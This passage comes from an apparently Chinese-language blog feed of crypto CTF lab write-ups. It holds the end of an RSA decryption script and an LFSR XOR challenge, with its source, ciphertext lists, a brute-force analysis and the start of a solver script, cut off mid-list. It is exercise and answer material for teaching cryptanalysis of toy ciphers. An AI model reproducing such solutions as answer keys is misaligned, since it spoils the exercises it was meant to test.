class="hljs-number">6290400850108673527783456723558868077251853788073859360516042680251422818079380463161520548743184302018140978345372703177688378631564416901363981788817257</span><br>c= <span class="hljs-number">3018879496435827891565409624549580574355607699876796814908055868300197064252462047054251836059387617618529706009316747223510404878163964048672091931778452</span><br>p= <span class="hljs-number">76169476301543338459784631236092619077954299832985654878386750436147105898219</span><br><span class="hljs-comment">#p=76169476301543338459784631236092619077954299477316510221604814354882725150720</span><br><span class="hljs-comment">#x1=355669144656781936081264380747499</span><br><span class="hljs-comment">#p=p+x1</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gp.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-Lab3</title>
    <link href="/post/Crypto-Lab3.html"/>
    <url>/post/Crypto-Lab3.html</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto-Lab3"><a href="#Crypto-Lab3" class="headerlink" title="Crypto-Lab3"></a>Crypto-Lab3</h1><h2 id="1-LFSR"><a href="#1-LFSR" class="headerlink" title="1.LFSR"></a>1.LFSR</h2><p>描述：LFSR，相关消息，还原出一个key即可get msg</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pylfsr <span class="hljs-keyword">import</span> LFSR<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>L1=LFSR(fpoly=[<span class="hljs-number">4</span>,<span class="hljs-number">1</span>],initstate=<span class="hljs-string">&#x27;random&#x27;</span>,verbose=<span class="hljs-literal">False</span>)<br>L2=LFSR(fpoly=[<span class="hljs-number">5</span>,<span class="hljs-number">2</span>],initstate=<span class="hljs-string">&#x27;random&#x27;</span>,verbose=<span class="hljs-literal">False</span>)<br><span class="hljs-keyword">assert</span>  flag[:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;flag&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_randpad</span>():<br>    res=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):<br>        res+=<span class="hljs-built_in">chr</span>(random.randint(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>))<br>    <span class="hljs-keyword">return</span> res<br>msg=get_randpad()+flag.decode()+get_randpad()<br>k1=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(L1.T):<br>    tmp=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        tmp+=<span class="hljs-built_in">str</span>(L1.<span class="hljs-built_in">next</span>())<br>    k1.append(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">2</span>))<br>k2=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(L2.T):<br>    tmp=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        tmp+=<span class="hljs-built_in">str</span>(L2.<span class="hljs-built_in">next</span>())<br>    k2.append(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">2</span>))<br><br>msg=msg.encode()<br>c1=[msg[i]^k1[i%<span class="hljs-built_in">len</span>(k1)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg))]<br>c2=[msg[i]^k2[i%<span class="hljs-built_in">len</span>(k2)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg))]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1=&#x27;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2=&#x27;</span>,c2)<br><span class="hljs-comment"># c1= [203, 156, 69, 228, 55, 211, 207, 98, 104, 155, 0, 36, 1, 236, 220, 253, 150, 26, 252, 37, 142, 177, 46, 121, 227, 76, 27, 80, 224, 139, 204, 184, 120, 244, 18, 232, 242, 38, 122, 131, 1, 14, 56, 156, 166, 222, 219, 101, 131, 119, 242, 240, 52, 118, 133, 124, 27, 51, 169, 147, 206, 215, 75, 178, 48, 151, 247, 55, 51, 217, 80, 26, 7, 147, 178, 195, 129, 97, 181, 62, 213, 215, 114, 71, 192, 127, 95, 42, 240, 215, 182, 191, 18, 154, 40, 159, 230, 22, 98, 138, 124, 72, 25, 148, 215, 242, 178, 110, 172, 38, 200, 162, 11, 106, 238, 73, 86, 74, 255, 205, 254, 144, 14, 186, 105, 239, 167, 1, 79, 140, 117, 28, 39, 191, 200, 219, 161, 122, 228, 104, 235, 238, 17, 60, 205, 79, 15, 79, 142, 212, 245, 142, 86, 157, 59, 225, 218, 110, 123, 139, 106, 45, 61, 237, 194, 194, 170, 80, 227, 118, 232, 231, 116, 87, 217, 126, 89, 0, 229, 153, 217, 212, 4, 163, 1, 157, 219, 57, 66, 136, 22, 33, 21, 254, 189, 168, 128, 19, 131, 28, 202, 231, 113, 86, 196, 69, 48, 81, 161, 145, 199, 128, 18, 138, 29, 209, 236, 15, 61, 238, 69, 5, 82, 191, 136, 166, 202, 90, 190, 100, 238, 201, 120, 49, 222, 16, 77, 83, 255, 133, 179, 163, 7, 187, 105, 128, 186, 60, 127, 193, 17, 52, 80, 174, 199, 204, 172, 100, 160, 27, 244, 192, 18, 87, 224, 74, 33, 21, 135, 194, 254, 128, 127, 158, 52, 238, 246, 60, 35, 241, 86, 18, 52, 130, 196, 227, 139, 24, 139, 24, 231, 201, 40, 90, 197, 92, 31, 63, 169, 147, 252, 186, 81, 141, 20, 254, 225, 8, 104, 148, 25, 71, 85, 171, 170, 244, 220, 121, 159, 33, 216, 188, 98, 53, 139, 65, 44, 82, 147, 133, 242, 163, 96, 145, 5, 195, 182, 11, 91, 199, 31, 37, 24, 128, 220, 163, 220, 93, 128, 124, 130, 172, 111, 123, 131, 103, 40, 10, 128, 144, 249, 160, 121, 231, 125, 205, 192, 40, 98, 135, 100, 11, 20, 135, 143, 240, 210, 99, 159, 3, 213, 169, 16, 35, 135, 74, 33, 26, 179, 159, 222, 220, 101, 137, 126, 220, 207, 114, 54, 157, 91, 8, 27, 175, 142, 164, 211, 19, 183, 33, 202, 234, 111, 51, 132, 11, 0, 78, 229, 193, 169, 137, 23, 251, 37, 148, 237, 109, 51, 214, 11, 82, 75, 248, 199, 164, 216, 19, 181, 113, 200, 242, 37, 54, 232, 87, 8, 86, 168, 179, 244, 206, 125, 251, 53, 252, 208, 125, 93, 157, 67, 91, 81, 230, 197, 255, 144, 12, 251, 57, 200, 243, 120, 95, 158, 115, 56, 43, 152, 162, 210, 140, 105, 146, 18, 133, 179, 43, 92, 203, 64, 39, 38, 237, 220, 221, 220, 79, 155, 108, 223, 195, 98, 49, 223, 123, 12, 93, 148, 200, 169, 183, 79, 147, 29, 216, 163, 4, 64, 242, 73, 79, 78, 151, 140, 241, 151, 122, 131, 57, 195, 168, 24, 71, 238, 100, 52, 10, 236, 214, 166, 186, 77, 190, 12, 148, 215, 116, 110, 148, 90, 70, 13, 138, 195, 181, 209, 66, 155, 8, 212, 238, 10, 61, 196, 112, 22, 93, 239, 150, 243, 136, 82, 151, 0, 212, 245, 21, 33, 128, 123, 90, 11, 191, 205, 182, 128, 17, 161, 104, 219, 201, 2, 96, 129, 123, 43, 26, 135, 216, 251, 165, 17, 243, 11, 147, 233, 46, 49, 128, 67, 2, 52, 230, 162, 243, 213, 11, 165, 100, 157, 222, 33, 54, 229, 82, 13, 16, 142, 139, 185, 130, 111, 164, 118, 152, 226, 51, 107, 136, 77, 26, 56, 155, 146, 230, 135, 7, 226, 28, 139, 254, 4, 100, 249, 23, 32, 57, 135, 158, 169, 144, 98, 145, 33, 253, 237, 96, 66, 197, 30, 75, 26, 224, 203, 200, 148, 2, 173, 19, 155, 187, 34, 83, 240, 111, 19, 12, 191, 214, 225, 218, 115, 128, 9, 232, 240, 52, 113, 217, 4, 73, 56, 226, 174, 194, 131, 100, 227, 119, 231, 186, 118, 79, 242, 10, 89, 41, 252, 157, 226, 201, 106, 235, 20, 250, 217, 1, 66, 134, 127, 87, 35, 147, 144, 179, 190, 117, 184, 97, 223, 222, 40, 95, 200, 99, 35, 0, 139, 198, 187, 170, 121, 255, 10, 132, 184, 31, 94, 157, 126, 65, 71, 164, 192, 173, 146, 12, 151, 7, 243, 250, 122, 106, 221, 100, 49, 36, 133, 135, 232, 146, 84, 178, 101, 250, 210, 103, 50, 133, 5, 83, 27, 164, 179, 244, 193, 29, 146, 60, 252, 242, 30, 88, 246, 10, 21, 15, 145, 206, 183, 190, 83, 159, 127, 150, 203, 0, 55, 204, 15, 11, 21, 250, 162, 181, 176, 90, 175, 47, 250, 208, 31, 119, 252, 4, 35, 27, 226, 141, 206, 211]</span><br><span class="hljs-comment"># c2= [188, 231, 200, 245, 189, 94, 29, 180, 236, 107, 134, 95, 79, 161, 95, 82, 20, 51, 198, 30, 240, 43, 175, 158, 245, 90, 206, 217, 96, 41, 62, 181, 203, 140, 146, 137, 92, 34, 235, 171, 126, 209, 93, 96, 214, 57, 14, 47, 95, 220, 34, 173, 120, 176, 206, 229, 84, 248, 146, 46, 8, 95, 142, 244, 217, 252, 181, 79, 112, 228, 247, 60, 198, 68, 115, 215, 28, 124, 10, 115, 149, 36, 249, 76, 170, 187, 159, 123, 137, 209, 111, 3, 82, 170, 255, 157, 174, 130, 93, 101, 206, 182, 33, 231, 61, 87, 220, 59, 68, 8, 110, 193, 46, 166, 73, 172, 203, 148, 28, 137, 156, 51, 122, 15, 200, 211, 134, 159, 156, 31, 21, 247, 199, 53, 134, 85, 126, 220, 68, 17, 46, 107, 164, 94, 173, 103, 179, 204, 226, 10, 213, 150, 61, 28, 31, 171, 197, 153, 162, 244, 118, 20, 200, 191, 117, 232, 94, 71, 176, 71, 122, 1, 39, 165, 23, 145, 40, 162, 212, 200, 99, 142, 212, 61, 17, 82, 178, 240, 242, 253, 230, 100, 50, 185, 210, 123, 208, 47, 97, 222, 16, 86, 65, 66, 154, 4, 134, 62, 177, 157, 242, 64, 128, 175, 18, 42, 0, 176, 179, 242, 191, 172, 9, 42, 242, 173, 99, 194, 119, 23, 199, 48, 31, 70, 102, 193, 85, 251, 34, 168, 219, 236, 15, 220, 221, 100, 98, 6, 135, 227, 130, 151, 231, 71, 111, 210, 221, 5, 205, 67, 108, 202, 61, 119, 59, 125, 169, 19, 157, 34, 183, 146, 248, 99, 194, 177, 49, 50, 94, 165, 251, 216, 137, 135, 16, 47, 239, 161, 31, 228, 84, 114, 244, 50, 73, 8, 113, 169, 29, 180, 120, 137, 139, 255, 120, 227, 157, 25, 33, 69, 194, 179, 129, 164, 146, 68, 106, 213, 211, 36, 207, 44, 15, 174, 79, 66, 33, 34, 183, 12, 177, 93, 155, 190, 230, 68, 136, 161, 13, 34, 65, 167, 242, 230, 238, 255, 22, 35, 217, 161, 108, 152, 41, 81, 180, 44, 114, 25, 66, 137, 20, 153, 79, 233, 195, 197, 100, 192, 143, 125, 14, 12, 136, 223, 212, 166, 244, 97, 20, 203, 227, 100, 242, 34, 1, 242, 51, 94, 18, 96, 163, 75, 148, 74, 225, 137, 228, 0, 153, 220, 46, 59, 2, 129, 235, 155, 255, 253, 64, 59, 233, 255, 116, 150, 41, 2, 225, 66, 19, 93, 50, 142, 72, 255, 119, 224, 155, 144, 6, 213, 197, 126, 102, 83, 212, 165, 157, 247, 174, 23, 57, 242, 230, 106, 225, 117, 88, 169, 22, 120, 12, 47, 178, 81, 160, 69, 135, 221, 231, 4, 207, 204, 99, 121, 83, 136, 235, 129, 234, 179, 69, 33, 174, 219, 110, 245, 67, 101, 213, 33, 125, 14, 64, 168, 41, 251, 41, 170, 187, 221, 86, 242, 175, 109, 126, 47, 209, 252, 227, 236, 190, 109, 102, 160, 247, 4, 211, 56, 104, 184, 78, 98, 5, 79, 182, 8, 254, 72, 134, 185, 208, 0, 133, 172, 49, 55, 31, 191, 197, 208, 168, 234, 96, 4, 211, 195, 18, 203, 59, 23, 178, 39, 80, 1, 65, 212, 36, 255, 101, 254, 158, 134, 92, 243, 197, 108, 109, 2, 171, 223, 214, 166, 158, 2, 43, 194, 232, 101, 156, 124, 86, 230, 7, 127, 46, 114, 150, 48, 237, 39, 158, 199, 213, 92, 137, 212, 35, 101, 20, 201, 231, 232, 156, 179, 18, 27, 192, 250, 13, 150, 117, 122, 183, 83, 114, 86, 108, 155, 83, 224, 107, 190, 183, 138, 124, 211, 205, 96, 36, 64, 215, 193, 214, 239, 154, 78, 52, 229, 220, 60, 147, 118, 120, 247, 71, 10, 4, 96, 153, 70, 162, 107, 154, 170, 195, 92, 221, 215, 124, 12, 68, 151, 205, 212, 140, 231, 101, 30, 192, 241, 122, 192, 94, 115, 227, 39, 92, 80, 86, 155, 95, 253, 117, 240, 199, 253, 84, 144, 136, 28, 96, 87, 157, 221, 236, 149, 186, 87, 42, 172, 234, 115, 235, 73, 122, 193, 9, 83, 6, 97, 213, 81, 144, 63, 131, 170, 204, 108, 132, 195, 3, 98, 76, 183, 208, 153, 250, 158, 21, 53, 252, 184, 11, 134, 76, 98, 211, 46, 98, 93, 72, 223, 37, 137, 112, 250, 172, 242, 69, 151, 128, 25, 38, 34, 156, 206, 233, 189, 142, 18, 119, 206, 192, 107, 246, 55, 3, 195, 54, 17, 42, 47, 209, 16, 231, 41, 161, 214, 229, 107, 238, 134, 107, 35, 12, 191, 197, 240, 138, 191, 88, 36, 248, 254, 96, 237, 66, 10, 169, 65, 6, 94, 107, 128, 58, 183, 63, 230, 189, 223, 123, 204, 180, 14, 19, 84, 151, 229, 247, 252, 235, 116, 45, 198, 162, 120, 255, 70, 29, 251, 68, 81, 6, 56, 187, 88, 137, 108, 161, 145, 242, 116, 247, 154, 6, 110, 36, 135, 186, 214, 152, 245]</span><br></code></pre></td></tr></table></figure><p>分析：</p><p>L1=LFSR(fpoly=[4,1],initstate=’random’,verbose=False) 生成4位的线性移位寄存器</p><p>通过L1.info()能查看寄存器的状态</p><p>只有L1状态与生成密文时的状态相同时，才能得到正确的加密密钥，4位不多，爆破就行，我这里直接每次重新生成一个，直到解得的结果里有flag</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pylfsr <span class="hljs-keyword">import</span> LFSR<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_randpad</span>():<br>    res=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):<br>        res+=<span class="hljs-built_in">chr</span>(random.randint(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>))<br>    <span class="hljs-keyword">return</span> res<br><br>c1= [<span class="hljs-number">203</span>, <span class="hljs-number">156</span>, <span class="hljs-number">69</span>, <span class="hljs-number">228</span>, <span class="hljs-number">55</span>, <span class="hljs-number">211</span>, <span class="hljs-number">207</span>, <span class="hljs-number">98</span>, <span class="hljs-number">104</span>, <span class="hljs-number">155</span>, <span class="hljs-number">0</span>, <span class="hljs-number">36</span>, <span class="hljs-number">1</span>, <span class="hljs-number">236</span>, <span class="hljs-number">220</span>, <span class="hljs-number">253</span>, <span class="hljs-number">150</span>, <span class="hljs-number">26</span>, <span class="hljs-number">252</span>, <span class="hljs-number">37</span>, <span class="hljs-number">142</span>, <span class="hljs-number">177</span>, <span class="hljs-number">46</span>, <span class="hljs-number">121</span>, <span class="hljs-number">227</span>, <span class="hljs-number">76</span>, <span class="hljs-number">27</span>, <span class="hljs-number">80</span>, <span class="hljs-number">224</span>, <span class="hljs-number">139</span>, <span class="hljs-number">204</span>, <span class="hljs-number">184</span>, <span class="hljs-number">120</span>, <span class="hljs-number">244</span>, <span class="hljs-number">18</span>, <span class="hljs-number">232</span>, <span class="hljs-number">242</span>, <span class="hljs-number">38</span>, <span class="hljs-number">122</span>, <span class="hljs-number">131</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">56</span>, <span class="hljs-number">156</span>, <span class="hljs-number">166</span>, <span class="hljs-number">222</span>, <span class="hljs-number">219</span>, <span class="hljs-number">101</span>, <span class="hljs-number">131</span>, <span class="hljs-number">119</span>, <span class="hljs-number">242</span>, <span class="hljs-number">240</span>, <span class="hljs-number">52</span>, <span class="hljs-number">118</span>, <span class="hljs-number">133</span>, <span class="hljs-number">124</span>, <span class="hljs-number">27</span>, <span class="hljs-number">51</span>, <span class="hljs-number">169</span>, <span class="hljs-number">147</span>, <span class="hljs-number">206</span>, <span class="hljs-number">215</span>, <span class="hljs-number">75</span>, <span class="hljs-number">178</span>, <span class="hljs-number">48</span>, <span class="hljs-number">151</span>, <span class="hljs-number">247</span>, <span class="hljs-number">55</span>, <span class="hljs-number">51</span>, <span class="hljs-number">217</span>, <span class="hljs-number">80</span>, <span class="hljs-number">26</span>, <span class="hljs-number">7</span>, <span class="hljs-number">147</span>, <span class="hljs-number">178</span>, <span class="hljs-number">195</span>, <span class="hljs-number">129</span>, <span class="hljs-number">97</span>, <span class="hljs-number">181</span>, <span class="hljs-number">62</span>, <span class="hljs-number">213</span>, <span class="hljs-number">215</span>, <span class="hljs-number">114</span>, <span class="hljs-number">71</span>, <span class="hljs-number">192</span>, <span class="hljs-number">127</span>, <span class="hljs-number">95</span>, <span class="hljs-number">42</span>, <span class="hljs-number">240</span>, <span class="hljs-number">215</span>, <span class="hljs-number">182</span>, <span class="hljs-number">191</span>, <span class="hljs-number">18</span>, <span class="hljs-number">154</span>, <span class="hljs-number">40</span>, <span class="hljs-number">159</span>, <span class="hljs-number">230</span>, <span class="hljs-number">22</span>, <span class="hljs-number">98</span>, <span class="hljs-number">138</span>, <span class="hljs-number">124</span>, <span class="hljs-number">72</span>, <span class="hljs-number">25</span>, <span class="hljs-number">148</span>, <span class="hljs-number">215</span>, <span class="hljs-number">242</span>, <span class="hljs-number">178</span>, <span class="hljs-number">110</span>, <span class="hljs-number">172</span>, <span class="hljs-number">38</span>, <span class="hljs-number">200</span>, <span class="hljs-number">162</span>, <span class="hljs-number">11</span>, <span class="hljs-number">106</span>, <span class="hljs-number">238</span>, <span class="hljs-number">73</span>, <span class="hljs-number">86</span>, <span class="hljs-number">74</span>, <span class="hljs-number">255</span>, <span class="hljs-number">205</span>, <span class="hljs-number">254</span>, <span class="hljs-number">144</span>, <span class="hljs-number">14</span>, <span class="hljs-number">186</span>, <span class="hljs-number">105</span>, <span class="hljs-number">239</span>, <span class="hljs-number">167</span>, <span class="hljs-number">1</span>, <span class="hljs-number">79</span>, <span class="hljs-number">140</span>, <span class="hljs-number">117</span>, <span class="hljs-number">28</span>, <span class="hljs-number">39</span>, <span class="hljs-number">191</span>, <span class="hljs-number">200</span>, <span class="hljs-number">219</span>, <span class="hljs-number">161</span>, <span class="hljs-number">122</span>, <span class="hljs-number">228</span>, <span class="hljs-number">104</span>, <span class="hljs-number">235</span>, <span class="hljs-number">238</span>, <span class="hljs-number">17</span>, <span class="hljs-number">60</span>, <span class="hljs-number">205</span>, <span class="hljs-number">79</span>, <span class="hljs-number">15</span>, <span class="hljs-number">79</span>, <span class="hljs-number">142</span>, <span class="hljs-number">212</span>, <span class="hljs-number">245</span>, <span class="hljs-number">142</span>, <span class="hljs-number">86</span>, <span class="hljs-number">157</span>, <span class="hljs-number">59</span>, <span class="hljs-number">225</span>, <span class="hljs-number">218</span>, <span class="hljs-number">110</span>, <span class="hljs-number">123</span>, <span class="hljs-number">139</span>, <span class="hljs-number">106</span>, <span class="hljs-number">45</span>, <span class="hljs-number">61</span>, <span class="hljs-number">237</span>, <span class="hljs-number">194</span>, <span class="hljs-number">194</span>, <span class="hljs-number">170</span>, <span class="hljs-number">80</span>, <span class="hljs-number">227</span>, <span class="hljs-number">118</span>, <span class="hljs-number">232</span>, <span class="hljs-number">231</span>, <span class="hljs-number">116</span>, <span class="hljs-number">87</span>, <span class="hljs-number">217</span>, <span class="hljs-number">126</span>, <span class="hljs-number">89</span>, <span class="hljs-number">0</span>, <span class="hljs-number">229</span>, <span class="hljs-number">153</span>, <span class="hljs-number">217</span>, <span class="hljs-number">212</span>, <span class="hljs-number">4</span>, <span class="hljs-number">163</span>, <span class="hljs-number">1</span>, <span class="hljs-number">157</span>, <span class="hljs-number">219</span>, <span class="hljs-number">57</span>, <span class="hljs-number">66</span>, <span class="hljs-number">136</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">21</span>, <span class="hljs-number">254</span>, <span class="hljs-number">189</span>, <span class="hljs-number">168</span>, <span class="hljs-number">128</span>, <span class="hljs-number">19</span>, <span class="hljs-number">131</span>, <span class="hljs-number">28</span>, <span class="hljs-number">202</span>, <span class="hljs-number">231</span>, <span class="hljs-number">113</span>, <span class="hljs-number">86</span>, <span class="hljs-number">196</span>, <span class="hljs-number">69</span>, <span class="hljs-number">48</span>, <span class="hljs-number">81</span>, <span class="hljs-number">161</span>, <span class="hljs-number">145</span>, <span class="hljs-number">199</span>, <span class="hljs-number">128</span>, <span class="hljs-number">18</span>, <span class="hljs-number">138</span>, <span class="hljs-number">29</span>, <span class="hljs-number">209</span>, <span class="hljs-number">236</span>, <span class="hljs-number">15</span>, <span class="hljs-number">61</span>, <span class="hljs-number">238</span>, <span class="hljs-number">69</span>, <span class="hljs-number">5</span>, <span class="hljs-number">82</span>, <span class="hljs-number">191</span>, <span class="hljs-number">136</span>, <span class="hljs-number">166</span>, <span class="hljs-number">202</span>, <span class="hljs-number">90</span>, <span class="hljs-number">190</span>, <span class="hljs-number">100</span>, <span class="hljs-number">238</span>, <span class="hljs-number">201</span>, <span class="hljs-number">120</span>, <span class="hljs-number">49</span>, <span class="hljs-number">222</span>, <span class="hljs-number">16</span>, <span class="hljs-number">77</span>, <span class="hljs-number">83</span>, <span class="hljs-number">255</span>, <span class="hljs-number">133</span>, <span class="hljs-number">179</span>, <span class="hljs-number">163</span>, <span class="hljs-number">7</span>, <span class="hljs-number">187</span>, <span class="hljs-number">105</span>, <span class="hljs-number">128</span>, <span class="hljs-number">186</span>, <span class="hljs-number">60</span>, <span class="hljs-number">127</span>, <span class="hljs-number">193</span>, <span class="hljs-number">17</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">174</span>, <span class="hljs-number">199</span>, <span class="hljs-number">204</span>, <span class="hljs-number">172</span>, <span class="hljs-number">100</span>, <span class="hljs-number">160</span>, <span class="hljs-number">27</span>, <span class="hljs-number">244</span>, <span class="hljs-number">192</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">224</span>, <span class="hljs-number">74</span>, <span class="hljs-number">33</span>, <span class="hljs-number">21</span>, <span class="hljs-number">135</span>, <span class="hljs-number">194</span>, <span class="hljs-number">254</span>, <span class="hljs-number">128</span>, <span class="hljs-number">127</span>, <span class="hljs-number">158</span>, <span class="hljs-number">52</span>, <span class="hljs-number">238</span>, <span class="hljs-number">246</span>, <span class="hljs-number">60</span>, <span class="hljs-number">35</span>, <span class="hljs-number">241</span>, <span class="hljs-number">86</span>, <span class="hljs-number">18</span>, <span class="hljs-number">52</span>, <span class="hljs-number">130</span>, <span class="hljs-number">196</span>, <span class="hljs-number">227</span>, <span class="hljs-number">139</span>, <span class="hljs-number">24</span>, <span class="hljs-number">139</span>, <span class="hljs-number">24</span>, <span class="hljs-number">231</span>, <span class="hljs-number">201</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">197</span>, <span class="hljs-number">92</span>, <span class="hljs-number">31</span>, <span class="hljs-number">63</span>, <span class="hljs-number">169</span>, <span class="hljs-number">147</span>, <span class="hljs-number">252</span>, <span class="hljs-number">186</span>, <span class="hljs-number">81</span>, <span class="hljs-number">141</span>, <span class="hljs-number">20</span>, <span class="hljs-number">254</span>, <span class="hljs-number">225</span>, <span class="hljs-number">8</span>, <span class="hljs-number">104</span>, <span class="hljs-number">148</span>, <span class="hljs-number">25</span>, <span class="hljs-number">71</span>, <span class="hljs-number">85</span>, <span class="hljs-number">171</span>, <span class="hljs-number">170</span>, <span class="hljs-number">244</span>, <span class="hljs-number">220</span>, <span class="hljs-number">121</span>, <span class="hljs-number">159</span>, <span class="hljs-number">33</span>, <span class="hljs-number">216</span>, <span class="hljs-number">188</span>, <span class="hljs-number">98</span>, <span class="hljs-number">53</span>, <span class="hljs-number">139</span>, <span class="hljs-number">65</span>, <span class="hljs-number">44</span>, <span class="hljs-number">82</span>, <span class="hljs-number">147</span>, <span class="hljs-number">133</span>, <span class="hljs-number">242</span>, <span class="hljs-number">163</span>, <span class="hljs-number">96</span>, <span class="hljs-number">145</span>, <span class="hljs-number">5</span>, <span class="hljs-number">195</span>, <span class="hljs-number">182</span>, <span class="hljs-number">11</span>, <span class="hljs-number">91</span>, <span class="hljs-number">199</span>, <span class="hljs-number">31</span>, <span class="hljs-number">37</span>, <span class="hljs-number">24</span>, <span class="hljs-number">128</span>, <span class="hljs-number">220</span>, <span class="hljs-number">163</span>, <span class="hljs-number">220</span>, <span class="hljs-number">93</span>, <span class="hljs-number">128</span>, <span class="hljs-number">124</span>, <span class="hljs-number">130</span>, <span class="hljs-number">172</span>, <span class="hljs-number">111</span>, <span class="hljs-number">123</span>, <span class="hljs-number">131</span>, <span class="hljs-number">103</span>, <span class="hljs-number">40</span>, <span class="hljs-number">10</span>, <span class="hljs-number">128</span>, <span class="hljs-number">144</span>, <span class="hljs-number">249</span>, <span class="hljs-number">160</span>, <span class="hljs-number">121</span>, <span class="hljs-number">231</span>, <span class="hljs-number">125</span>, <span class="hljs-number">205</span>, <span class="hljs-number">192</span>, <span class="hljs-number">40</span>, <span class="hljs-number">98</span>, <span class="hljs-number">135</span>, <span class="hljs-number">100</span>, <span class="hljs-number">11</span>, <span class="hljs-number">20</span>, <span class="hljs-number">135</span>, <span class="hljs-number">143</span>, <span class="hljs-number">240</span>, <span class="hljs-number">210</span>, <span class="hljs-number">99</span>, <span class="hljs-number">159</span>, <span class="hljs-number">3</span>, <span class="hljs-number">213</span>, <span class="hljs-number">169</span>, <span class="hljs-number">16</span>, <span class="hljs-number">35</span>, <span class="hljs-number">135</span>, <span class="hljs-number">74</span>, <span class="hljs-number">33</span>, <span class="hljs-number">26</span>, <span class="hljs-number">179</span>, <span class="hljs-number">159</span>, <span class="hljs-number">222</span>, <span class="hljs-number">220</span>, <span class="hljs-number">101</span>, <span class="hljs-number">137</span>, <span class="hljs-number">126</span>, <span class="hljs-number">220</span>, <span class="hljs-number">207</span>, <span class="hljs-number">114</span>, <span class="hljs-number">54</span>, <span class="hljs-number">157</span>, <span class="hljs-number">91</span>, <span class="hljs-number">8</span>, <span class="hljs-number">27</span>, <span class="hljs-number">175</span>, <span class="hljs-number">142</span>, <span class="hljs-number">164</span>, <span class="hljs-number">211</span>, <span class="hljs-number">19</span>, <span class="hljs-number">183</span>, <span class="hljs-number">33</span>, <span class="hljs-number">202</span>, <span class="hljs-number">234</span>, <span class="hljs-number">111</span>, <span class="hljs-number">51</span>, <span class="hljs-number">132</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">78</span>, <span class="hljs-number">229</span>, <span class="hljs-number">193</span>, <span class="hljs-number">169</span>, <span class="hljs-number">137</span>, <span 